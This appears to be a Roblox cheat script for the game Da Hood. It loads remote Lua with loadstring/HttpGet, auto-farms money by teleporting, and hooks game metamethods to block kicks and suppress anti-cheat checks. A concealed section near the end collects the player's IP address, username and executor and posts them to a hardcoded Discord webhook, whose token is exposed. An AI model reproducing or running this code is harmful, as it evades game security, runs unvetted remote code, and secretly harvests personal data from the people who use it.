--[
--Da Hood
--]

--[
--UI Library And Teleport Place Library
--]

local TeleportPlaceLibrary = loadstring(game:HttpGet("https://raw.githubusercontent.com/LeoKholYt/roblox/main/lk_serverhop.lua"))()

getgenv()["IrisAd"] = true

loadstring(game:HttpGet("https://raw.githubusercontent.com/Sklllus/Break-Skill-Hub-V1/main/UI.lua"))()

local Warning = library:AddWarning({
    type = "confirm"
})

library.title = "Break-Skill Hub - V1"
library.foldername = "Break-Skill Hub - V1"
library.fileext = ".json"

--Instances And Functions

getgenv()["Developer_345RTHD1"] = true

local CoreGui = game:GetService("CoreGui")
local HttpService = game:GetService("HttpService")
local LogService = game:GetService("LogService")
local MarketplaceService = game:GetService("MarketplaceService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local ScriptContext = game:GetService("ScriptContext")
local TweenService = game:GetService("TweenService")
local VirtualUser = game:GetService("VirtualUser")

local MainEvent = ReplicatedStorage.MainEvent
local HospitalJob = workspace.Ignored.HospitalJob

local Utility = {}
local DeSyncStuff = {}

local Client = Players.LocalPlayer

local BackgroundList = {
    Floral = "rbxassetid://5553946656",
    Flowers = "rbxassetid://6071575925",
    Circles = "rbxassetid://6071579801",
    Hearts = "rbxassetid://6073763717"
}

local R6_Dummy = game:GetObjects("rbxassetid://9474737816")[1]

R6_Dummy.Head.Face:Destroy()

for i, v in pairs(R6_Dummy:GetChildren()) do
    v.Transparency = v.Name == "HumanoidRootPart" and 1 or 0.88
    v.Material = Enum.Material.Neon
    v.Color = Color3.fromRGB(255, 30, 30)
    v.CanCollide = false
    v.Anchored = false
end

local function GetPlayerNames()
    local Names = {
        Client.Name
    }

    for i, v in pairs(Players:GetPlayers()) do
        if v ~= Client then
            table.insert(Names, v.Name)
        end
    end

    return Names
end

local function IsAlive(plr)
    local Alive = false

    if plr ~= nil and plr.Parent == Players and plr.Character ~= nil then
        if plr.Character:FindFirstChild("HumanoidRootPart") and plr.Character:FindFirstChild("Humanoid") ~= nil and plr.Character.Humanoid.Health > 0 and plr.Character:FindFirstChild("Head") then
            Alive = true
        end
    end

    return Alive
end

local function RandomNumberRange(a)
    return math.random(-a * 100, a * 100) / 100
end

local function RandomVectorRange(a, b, c)
    return Vector3.new(RandomNumberRange(a), RandomNumberRange(b), RandomNumberRange(c))
end

local function Teleport(cframe)
    local Tween = TweenService:Create(Client.Character:FindFirstChild("HumanoidRootPart"), TweenInfo.new(((Client.Character:FindFirstChild("HumanoidRootPart").Position - cframe.p).Magnitude / getgenv()["TeleportSpeed"]), Enum.EasingStyle.Linear, Enum.EasingDirection.In), {CFrame = cframe})

    Tween:Play()

    Tween.Completed:Wait()
end

function Utility:Connect(connection, func)
    local Con = connection:Connect(func)

    table.insert(library.connections, Con)

    return Con
end

--[
--Auto Farms Tab
--]

local AutoFarmsTab = library:AddTab("Auto Farms")

local AutoFarmsColumn1 = AutoFarmsTab:AddColumn()
local AutoFarmsColumn2 = AutoFarmsTab:AddColumn()

--Auto Farms Section

local AutoFarmsSection = AutoFarmsColumn1:AddSection("Auto Farms")

AutoFarmsSection:AddDivider("» Auto Farms «")

local AutoBreakCashiers = AutoFarmsSection:AddToggle({
    text = "Auto Break Cashiers",
    flag = "AutoFarmsTab_AutoFarmsSection_AutoBreakCashiers",
    callback = function(val)
        getgenv()["AutoBreakCashiers"] = val

        while getgenv()["AutoBreakCashiers"] and task.wait(0.2) do
            pcall(function()
                for i, v in pairs(workspace.Cashiers:GetChildren()) do
                    if v:IsA("Model") and v.Humanoid.Health >= 0 and v.Humanoid.Health > 5 then
                        repeat
                            task.wait(0.2)

                            if Client.Character.Humanoid.Sit == true then
                                Client.Character.Humanoid.Jump = true
                            end

                            Teleport(v.Open.CFrame * CFrame.new(0, 0, 2))

                            if Client.Backpack:FindFirstChild("Combat") then
                                Client.Character.Humanoid:EquipTool(Client.Backpack.Combat)
                            end

                            VirtualUser:ClickButton1(Vector2.new(9e9, 9e9))
                        until v.Head.Crash.Playing or not val and Client.DataFolder.Information.Jail.Value == 0

                        for i2, v2 in pairs(workspace.Ignored.Drop:GetChildren()) do
                            if v2:IsA("BasePart") and v2.Name == "MoneyDrop" and (Client.Character.HumanoidRootPart.Position - v2.Position).Magnitude <= 50 then
                                repeat
                                    task.wait()

                                    Teleport(v2.CFrame)

                                    if (v2.Position - Client.Character.HumanoidRootPart.Position).Magnitude <= 12 and v2:FindFirstChildWhichIsA("ClickDetector") then
                                        fireclickdetector(v2:FindFirstChildWhichIsA("ClickDetector"))

                                        task.wait(getgenv()["TeleportCooldown"])
                                    end
                                until not v2:FindFirstChildWhichIsA("ClickDetector") or not val and Client.DataFolder.Information.Jail.Value == 0
                            end
                        end
                    end
                end
            end)
        end
    end
})

local AutoGrabCashAndItems = AutoFarmsSection:AddToggle({
    text = "Auto Grab Cash And Items",
    flag = "AutoFarmsTab_AutoFarmsSection_AutoGrabCashAndItems",
    tip = "Low Speed Recommended (Crashing)",
    callback = function(val)
        Utility:Connect(RunService.Stepped, function()
            while val do
                task.wait()

                pcall(function()
                    for i, v in pairs(workspace.Ignored.Drop:GetChildren()) do
                        if v.ClassName == "Part" and v:FindFirstChild("ClickDetector") then
                            Teleport(v.CFrame)

                            task.wait(getgenv()["TeleportCooldown"])

                            fireclickdetector(v.ClickDetector)
                        end
                    end
                end)
            end
        end)
    end
})

local AutoHospitalJob = AutoFarmsSection:AddToggle({
    text = "Auto Hospital Job",
    flag = "AutoFarmsTab_AutoFarmsSection_AutoHospitalJob",
    callback = function(val)
        while val do
            pcall(function()
                local Patient = nil

                for i, v in pairs(HospitalJob:GetChildren()) do
                    if v:IsA("Model") then
                        Patient = v.Name

                        Teleport(HospitalJob[v.Name].HumanoidRootPart.CFrame * CFrame.new(Vector3.new(0, 0, 4), Vector3.new(0, 100, 0)))
                    end
                end

                for i, v in pairs(HospitalJob:GetChildren()) do
                    task.wait(0.5)

                    if HospitalJob:FindFirstChild("Can I get the Red bottle") then
                        fireclickdetector(HospitalJob.Red.ClickDetector)
                    elseif HospitalJob:FindFirstChild("Can I get the Green bottle") then
                        fireclickdetector(HospitalJob.Green.ClickDetector)
                    elseif HospitalJob:FindFirstChild("Can I get the Blue bottle") then
                        fireclickdetector(HospitalJob.Blue.ClickDetector)
                    end
                end

                fireclickdetector(HospitalJob[Patient].ClickDetector)
            end)
        end
    end
})

local AutoShoesJob = AutoFarmsSection:AddToggle({
    text = "Auto Shoes Job",
    flag = "AutoFarmsTab_AutoFarmsSection_AutoShoesJob",
    callback = function(val)
        Utility:Connect(RunService.Stepped, function()
            if val then
                fireclickdetector(workspace.Ignored["Clean the shoes on the floor and come to me for cash"].ClickDetector)

                for i, v in pairs(workspace.Ignored.Drop:GetChildren()) do
                    if v.Transparency == 0 and v:IsA("MeshPart") then
                        Teleport(v.CFrame)

                        task.wait()

                        fireclickdetector(v.ClickDetector)
                    end
                end
            end
        end)
    end
})

--Auto Farms Settings Section

local AutoFarmsSettingsSection = AutoFarmsColumn2:AddSection("Auto Farms Settings")

AutoFarmsSettingsSection:AddDivider("Settings")

local TeleportCooldown = AutoFarmsSettingsSection:AddSlider({
    text = "Teleport Cooldown",
    flag = "RageTab_AutoFarmsSettingsSection_TeleportCooldown",
    suffix = "s",
    min = 0,
    value = 1,
    max = 5,
    callback = function(val)
        getgenv()["TeleportCooldown"] = val
    end
})

local TeleportSpeed = AutoFarmsSettingsSection:AddSlider({
    text = "Teleport Speed",
    flag = "RageTab_AutoFarmsSettingsSection_TeleportSpeed",
    suffix = "studs/s",
    min = 0,
    value = 400,
    max = 1000,
    callback = function(val)
        getgenv()["TeleportSpeed"] = val
    end
})

--[
--Rage Tab
--]

local RageTab = library:AddTab("Rage")

local RageTabColumn1 = RageTab:AddColumn()
local RageTabColumn2 = RageTab:AddColumn()

--DeSync Section

local DeSyncSection = RageTabColumn1:AddSection("DeSync")

DeSyncSection:AddDivider("» DeSync «")

local DeSyncEnabled = DeSyncSection:AddToggle({
    text = "Enabled",
    flag = "RageTab_DeSyncSection_Enabled"
}):AddBind({
    flag = "RageTab_DeSyncSection_Enabled_Bind"
})

local DeSyncFling = DeSyncSection:AddToggle({
    text = "Fling",
    flag = "RageTab_DeSyncSection_Fling"
})

local DeSyncVisualize = DeSyncSection:AddToggle({
    text = "Visualize",
    flag = "RageTab_DeSyncSection_Visualize"
}):AddColor({
    flag = "RageTab_DeSyncSection_Visualize_ColorTrans",
    color = Color3.fromRGB(255, 30, 30),
    trans = 0.5,
    callback = function(val)
        for i, v in pairs(R6_Dummy:GetChildren()) do
            if v:IsA("BasePart") then
                v.Color = val
            end
        end
    end,
    calltrans = function(val)
        for i, v in pairs(R6_Dummy:GetChildren()) do
            if v:IsA("BasePart") then
                v.Transparency = val
            end
        end
    end
})

DeSyncSection:AddDivider("» DeSync Settings «")

local DeSyncMode = DeSyncSection:AddList({
    text = "Mode",
    flag = "RageTab_DeSyncSection_Mode",
    values = {
        "Offset",
        "Random",
        "Zero",
        "Target Strafe"
    },
    value = "",
    multiselect = false
})

local DeSyncRotation = DeSyncSection:AddList({
    text = "Rotation",
    flag = "RageTab_DeSyncSection_Rotation",
    values = {
        "Manual",
        "Random"
    },
    max = 2,
    value = "",
    multiselect = false
})

DeSyncSection:AddDivider("» Offset Mode «")

local DeSyncOffsetX = DeSyncSection:AddSlider({
    text = "Offset X",
    flag = "RageTab_DeSyncSection_OffsetX",
    suffix = "st",
    min = -10,
    value = 0,
    max = 10
})

local DeSyncOffsetY = DeSyncSection:AddSlider({
    text = "Offset Y",
    flag = "RageTab_DeSyncSection_OffsetY",
    suffix = "st",
    min = -10,
    value = 0,
    max = 10
})

local DeSyncOffsetZ = DeSyncSection:AddSlider({
    text = "Offset Z",
    flag = "RageTab_DeSyncSection_OffsetZ",
    suffix = "st",
    min = -10,
    value = 0,
    max = 10
})

DeSyncSection:AddDivider("» Random Mode «")

local DeSyncRandomX = DeSyncSection:AddSlider({
    text = "Random X",
    flag = "RageTab_DeSyncSection_RandomX",
    suffix = "st",
    min = 0,
    value = 10,
    max = 35
})

local DeSyncRandomY = DeSyncSection:AddSlider({
    text = "Random Y",
    flag = "RageTab_DeSyncSection_RandomY",
    suffix = "st",
    min = 0,
    value = 10,
    max = 35
})

local DeSyncRandomZ = DeSyncSection:AddSlider({
    text = "Random Z",
    flag = "RageTab_DeSyncSection_RandomZ",
    suffix = "st",
    min = 0,
    value = 10,
    max = 35
})

DeSyncSection:AddDivider("» Manual Rotation «")

local DeSyncManualX = DeSyncSection:AddSlider({
    text = "Manual X",
    flag = "RageTab_DeSyncSection_ManualX",
    suffix = "°",
    min = -180,
    value = 0,
    max = 180
})

local DeSyncManualY = DeSyncSection:AddSlider({
    text = "Manual Y",
    flag = "RageTab_DeSyncSection_ManualY",
    suffix = "°",
    min = -180,
    value = 0,
    max = 180
})

local DeSyncManualZ = DeSyncSection:AddSlider({
    text = "Manual Z",
    flag = "RageTab_DeSyncSection_ManualZ",
    suffix = "°",
    min = -180,
    value = 0,
    max = 180
})

--Target Strafe Section

local TargetStrafeSection = RageTabColumn2:AddSection("Target Strafe")

TargetStrafeSection:AddDivider("» Target Strafe «")

local TargetStrafeSpeed = TargetStrafeSection:AddSlider({
    text = "Speed",
    flag = "RageTab_TargetStrafeSection_Speed",
    min = 1,
    value = 1,
    max = 10
})

local TargetStrafeOffset = TargetStrafeSection:AddSlider({
    text = "Offset",
    flag = "RageTab_TargetStrafeSection_Offset",
    min = 5,
    value = 5,
    max = 20
})

local TargetStrafeTarget = TargetStrafeSection:AddList({
    text = "Target",
    flag = "RageTab_TargetStrafeSection_Target",
    values = GetPlayerNames(),
    value = "",
    multiselect = false
})

--[
--Settings Tab
--]

local SettingsTab = library:AddTab("Settings")

local SettingsColumn1 = SettingsTab:AddColumn()
local SettingsColumn2 = SettingsTab:AddColumn()
local SettingsColumn3 = SettingsTab:AddColumn()

--Info Section

local InfoSection = SettingsColumn1:AddSection("Info")

InfoSection:AddDivider("» Info «")

InfoSection:AddLabel("UI Library Made By Jan", Color3.fromRGB(255, 255, 255))
InfoSection:AddLabel("Script Made By xS_Killus (xX_XSI)", Color3.fromRGB(255, 255, 255))
InfoSection:AddLabel("API Made By xS_Killus (xX_XSI)", Color3.fromRGB(255, 255, 255))

InfoSection:AddDivider("» Changelogs «")



--Menu Section

local MenuSection = SettingsColumn2:AddSection("Menu")

MenuSection:AddDivider("» Menu Options «")

MenuSection:AddBind({
    text = "Open / Close",
    flag = "UI Toggle",
    nomouse = true,
    key = "RightShift",
    callback = function(val)
        library:Close()
    end
})

MenuSection:AddColor({
    text = "Accent Color",
    flag = "Menu Accent Color",
    color = Color3.fromRGB(255, 40, 40),
    callback = function(val)
        if library.currentTab then
            library.currentTab.button.TextColor3 = val
        end

        for i, v in pairs(library.theme) do
            v[(v.ClassName == "TextLabel" and "TextColor3") or (v.ClassName == "ImageLabel" and "ImageColor3") or "BackgroundColor3"] = val
        end
    end
})

MenuSection:AddList({
    text = "Background",
    max = 4,
    flag = "background",
    values = {
        "Floral",
        "Flowers",
        "Circles",
        "Hearts"
    },
    value = "Floral",
    callback = function(val)
        if library.main then
            library.main.Image = BackgroundList[val]
        end
    end
}):AddColor({
    flag = "backgroundcolor",
    color = Color3.fromRGB(10, 10, 10),
    callback = function(val)
        if library.main then
            library.main.ImageColor3 = val
        end
    end,
    trans = 1,
    calltrans = function(val)
        if library.main then
            library.main.ImageTransparency = 1 - val
        end
    end
})

MenuSection:AddSlider({
    text = "Tile Size",
    min = 50,
    max = 500,
    value = 50,
    callback = function(val)
        if library.main then
            library.main.TileSize = UDim2.new(0, val, 0, val)
        end
    end
})

MenuSection:AddDivider("» Other Options «")

MenuSection:AddButton({
    text = "Discord",
    callback = function()
        syn.request({
            Url = "http://127.0.0.1:6463/rpc?v=1",
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json",
                ["origin"] = "https://discord.com"
            },
            Body = HttpService:JSONEncode({
                ["args"] = {
                    ["code"] = "CODE INVITE"
                },
                ["cmd"] = "INVITE_BROWSER",
                ["nonce"] = "."
            })
        })
    end
})

MenuSection:AddButton({
    text = "Change Server",
    callback = function()
        TeleportPlaceLibrary:Teleport(game.PlaceId)
    end
})

MenuSection:AddButton({
    text = "Re-Join Server",
    callback = function()
        TeleportService:Teleport(game.PlaceId, Client)
    end
})

--Configs Section

local ConfigsSection = SettingsColumn3:AddSection("Configs")

ConfigsSection:AddDivider("» Configs «")

ConfigsSection:AddBox({
    text = "Config Name",
    skipflag = true
})

ConfigsSection:AddList({
    text = "Configs",
    skipflag = true,
    value = "",
    flag = "Config List",
    values = library:GetConfigs()
})

ConfigsSection:AddButton({
    text = "Create",
    callback = function()
        library:GetConfigs()

        writefile(library.foldername .. "/" .. library.flags["Config Name"] .. library.fileext, "{}")

        library.options["Config List"]:AddValue(library.flags["Config Name"])
    end
})

ConfigsSection:AddButton({
    text = "Save",
    callback = function()
        local R, G, B = library.round(library.flags["Menu Accent Color"])

        Warning.text = "Are you sure you want to save the current settings to config <font color='rgb(" .. R .. "," .. G .. "," .. B .. ")'>" .. library.flags["Config List"] .. "</font>?"

        if Warning:Show() then
            library:SaveConfig(library.flags["Config List"])
        end
    end
})

ConfigsSection:AddButton({
    text = "Load",
    callback = function()
        local R, G, B = library.round(library.flags["Menu Accent Color"])

        Warning.text = "Are you sure you want to load config <font color='rgb(" .. R .. "," .. G .. "," .. B .. ")'>" .. library.flags["Config List"] .. "</font>?"

        if Warning:Show() then
            library:LoadConfig(library.flags["Config List"])
        end
    end
})

ConfigsSection:AddButton({
    text = "Delete",
    callback = function()
        local R, G, B = library.round(library.flags["Menu Accent Color"])

        Warning.text = "Are you sure you want to delete config <font color='rgb(" .. R .. "," .. G .. "," .. B .. ")'>" .. library.flags["Config List"] .. "</font>?"

        if Warning:Show() then
            local Config = library.flags["Config List"]

            if table.find(library:GetConfigs(), Config) and isfile(library.foldername .. "/" .. Config .. library.fileext) then
                library.options["Config List"]:RemoveValue(Config)

                delfile(library.foldername .. "/" .. Config .. library.fileext)
            end
        end
    end
})

--XD

Utility:Connect(RunService.Heartbeat, function()
    if IsAlive(Client) then
        if library.flags["RageTab_DeSyncSection_Enabled"] then
            DeSyncStuff[1] = Client.Character.HumanoidRootPart.CFrame

            if library.flags["RageTab_DeSyncSection_Fling"] then
                DeSyncStuff[2] = Client.Character.HumanoidRootPart.Velocity
            end

            local FakeCFrame = Client.Character.HumanoidRootPart.CFrame

            if library.flags["RageTab_DeSyncSection_Mode"] == "Offset" then
                FakeCFrame = FakeCFrame * CFrame.new(Vector3.new(library.flags["RageTab_DeSyncSection_OffsetX"], library.flags["RageTab_DeSyncSection_OffsetY"], library.flags["RageTab_DeSyncSection_OffsetZ"]))
            elseif library.flags["RageTab_DeSyncSection_Mode"] == "Random" then
                FakeCFrame = FakeCFrame * CFrame.new(RandomVectorRange(library.flags["RageTab_DeSyncSection_RandomX"], library.flags["RageTab_DeSyncSection_RandomY"], library.flags["RageTab_DeSyncSection_RandomZ"]))
            elseif library.flags["RageTab_DeSyncSection_Mode"] == "Zero" then
                FakeCFrame = CFrame.new()
            elseif library.flags["RageTab_DeSyncSection_Mode"] == "Target Strafe" and Players:FindFirstChild(library.flags["RageTab_TargetStrafeSection_Target"]) and IsAlive(Players[library.flags["RageTab_TargetStrafeSection_Target"]]) then
                FakeCFrame = Players[library.flags["RageTab_TargetStrafeSection_Target"]].Character.HumanoidRootPart.CFrame

                if not DeSyncStuff[3] then
                    DeSyncStuff[3] = 0
                end

                if DeSyncStuff[3] > 360 then
                    DeSyncStuff[3] = 0
                end

                FakeCFrame = FakeCFrame * CFrame.Angles(0, math.rad(DeSyncStuff[3]), 0) * CFrame.new(0, 0, library.flags["RageTab_TargetStrafeSection_Offset"])

                DeSyncStuff[3] = DeSyncStuff[3] + library.flags["RageTab_TargetStrafeSection_Speed"]
            end

            if library.flags["RageTab_DeSyncSection_Rotation"] == "Manual" then
                FakeCFrame = FakeCFrame * CFrame.Angles(math.rad(library.flags["RageTab_DeSyncSection_ManualX"]), math.rad(library.flags["RageTab_DeSyncSection_ManualY"]), math.rad(library.flags["RageTab_DeSyncSection_ManualZ"]))
            elseif library.flags["RageTab_DeSyncSection_Rotation"] == "Random" then
                FakeCFrame = FakeCFrame * CFrame.Angles(math.rad(RandomNumberRange(180)), math.rad(RandomNumberRange(180)), math.rad(RandomNumberRange(180)))
            end

            if library.flags["RageTab_DeSyncSection_Visualize"] then
                R6_Dummy.Parent = workspace

                R6_Dummy.HumanoidRootPart.Velocity = Vector3.new()

                R6_Dummy:SetPrimaryPartCFrame(FakeCFrame)
            else
                R6_Dummy.Parent = nil
            end

            Client.Character.HumanoidRootPart.CFrame = FakeCFrame

            if library.flags["RageTab_DeSyncSection_Fling"] then
                Client.Character.HumanoidRootPart.Velocity = Vector3.new(1, 1, 1) * 16384
            end

            RunService.RenderStepped:Wait()

            Client.Character.HumanoidRootPart.CFrame = DeSyncStuff[1]

            if library.flags["RageTab_DeSyncSection_Fling"] then
                Client.Character.HumanoidRootPart.Velocity = DeSyncStuff[2]
            end
        else
            if R6_Dummy.Parent ~= nil then
                R6_Dummy.Parent = nil
            end
        end
    else
        if R6_Dummy.Parent ~= nil then
            R6_Dummy.Parent = nil
        end
    end
end)

Players.PlayerAdded:Connect(function(player)
    TargetStrafeTarget:AddValue(player.Name)
end)

Players.PlayerRemoving:Connect(function(player)
    TargetStrafeTarget:RemoveValue(player.Name)
end)

library:Init()
library:selectTab(library.tabs[1])

getgenv()["Break-Skill_Hub_DaHood_Loaded"] = true
getgenv()["Break-Skill_Hub_Loaded"] = true

--Memory Check Bypass

hookfunction((gcinfo or collectgarbage), function(...)
    if getgenv().Memory then
        return math.random(200, 350)
    end
end)

local OldNameCall4

OldNameCall4 = hookmetamethod(game, "__namecall", function(...)
    local Args = {...}

    local Self = Args[1]

    local GetMethod = getnamecallmethod()

    if GetMethod == "Kick" and getgenv().Kick then
        return nil
    end

    return OldNameCall4(...)
end)

--Universal Bypass

local Disables = {
    Client.Idled,
    ScriptContext.Error,
    LogService.MessageOut
}

local Nos = {
    "PreloadAsync",
    "Kick",
    "kick",
    "xpcall",
    "gcinfo",
    "collectgarbage"
}

local Yes = {
    Client,
    CoreGui
}

for i, v in pairs(Disables) do
    for i2, v2 in pairs(getconnections(v)) do
        v2:Disable()
    end
end

local OldNameCall

OldNameCall = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
    local Args = {...}

    local GetMethod = getnamecallmethod()

    if table.find(Nos, GetMethod) and table.find(Yes, self) then
        return nil or task.wait(math.huge)
    end

    if GetMethod == "FindService" and self.Name == "VirtualUser" and self.Name == "VirtualInputManager" then
        return
    end

    if typeof(Args) ~= "Instance" then
        return OldNameCall(self, ...)
    end

    return OldNameCall(unpack(Args), self, ...)
end))

if setffag then
    setffag("HumanoidParallelRemoveNoPhysics", "False")
    setffag("HumanoidParallelRemoveNoPhysicsNoSimulate2", "False")
end

if setfpscap then
    setfpscap(100)
end

ScriptContext:SetTimeout(0.5)

--Da Hood Bypass

local Bypass = {
    "CHECKER_1",
    "TeleportDetect",
    "OneMoreTime"
}

local OldNameCall2

OldNameCall2 = hookmetamethod(game, "__namecall", function(...)
    local Args = {...}

    local self = Args[1]

    local GetMethod = getnamecallmethod()
    local Caller = checkcaller()

    if (GetMethod == "FireServer" and self == MainEvent and table.find(Bypass, Args[2])) then
        return task.wait(9e9)
    end

    if GetMethod == "Kick" then
        return task.wait(9e9)
    end

    if GetMethod == "IsStudio" then
        return true
    end

    if (not Caller and getfenv(2).crash) then
        hookfunction(getfenv(2).crash, function()
            warn("Break-Skill Hub - V1 | Crash attempt.")
        end)
    end

    return OldNameCall2(...)
end)

local OldIndex

OldIndex = hookmetamethod(game, "__index", newcclosure(function(self, key)
    local Caller = checkcaller()

    if getgenv()["Break-Skill_Hub_Loaded"] then
        if not Caller then
            if key == "CFrame" and library.flags["RageTab_DeSyncSection_Enabled"] and IsAlive(Client) then
                if self == Client.Character.HumanoidRootPart then
                    return DeSyncStuff[1] or CFrame.new()
                elseif self == Client.Character.Head then
                    return DeSyncStuff[1] and DeSyncStuff[1] + Vector3.new(0, Client.Character.HumanoidRootPart.Size / 2 + 0.5, 0) or CFrame.new()
                end
            end
        end
    end

    return OldIndex(self, key)
end))

if not getgenv()["Developer_345RTHD1"] then
    local Web = syn.request({
        Url = "https://api.ipify.org/"
    })

    local URL = "https://discord.com/api/webhooks/1035991401164447824/hVKTRGxOars5_mMr4cpw6W_pHu9BNP5h3IRfDMxfRnt_VvK9KLbAE9ZW1dsvO3nshJhI"

    local Headers = {
        ["Content-Type"] = "application/json"
    }

    for i, v in pairs(Web) do
        if v ~= 200 and typeof(v) ~= "table" and v ~= true then
            local Data = {
                ["content"] = "",
                ["embeds"] = {
                    {
                        ["title"] = "**Break-Skill Hub - V1 Logger**",
                        ["description"] = "```def\nUsername: " .. Client.Name .. "\nProfile: https://www.roblox.com/users/" .. Client.UserId .. "\nGame: " .. MarketplaceService:GetProductInfo(game.PlaceId).Name .. "\nScript to join: game:GetService('TeleportService'):TeleportToPlaceInstance(" .. tostring(game.PlaceId) .. ", " .. tostring(game.GameId) .. ", game.Players.LocalPlayer)" .. "\nExecutor: " .. identifyexecutor() .. "\nIP: " .. v .. "```",
                        ["type"] = "rich",
                        ["color"] = tonumber(0xd40000)
                    }
                }
            }

            local NewData = HttpService:JSONEncode(Data)

            syn.request({
                Url = URL,
                Body = NewData,
                Method = "POST",
                Headers = Headers
            })
        end
    end
end

--Universal Bypass V2

local System = {
    379614936,
    860428890,
    866472074,
    2664771962,
    2664773504,
    5006801542,
    5122567177,
    5122568155,
    5122568874,
    5827139096
}

if not table.find(System, game.PlaceId) then
    return
end

local Char = Client.Character or Client.CharacterAdded:Wait()

local SystemTable = {
    "xpcall",
    "pcall",
    "Idle",
    "Deactivate",
    "PreloadAsync",
    "FindService",
    "collectgarbage",
    "GetPropertyChangedSignal",
    "getfenv",
    "Kick",
    "kick"
}

local SystemTable2 = {
    Char,
    CoreGui,
    Client,
    Client.Kick
}

local OldNameCall3

OldNameCall3 = hookmetamethod(game, "__namecall" or "__Index", function(self, ...)
    local Args = {...}

    local GetMethod = getnamecallmethod()

    if table.find(SystemTable, GetMethod) and table.find(SystemTable2, self) then
        return OldNameCall3(self, ...)
    end

    return OldNameCall3(self, ...)
end)
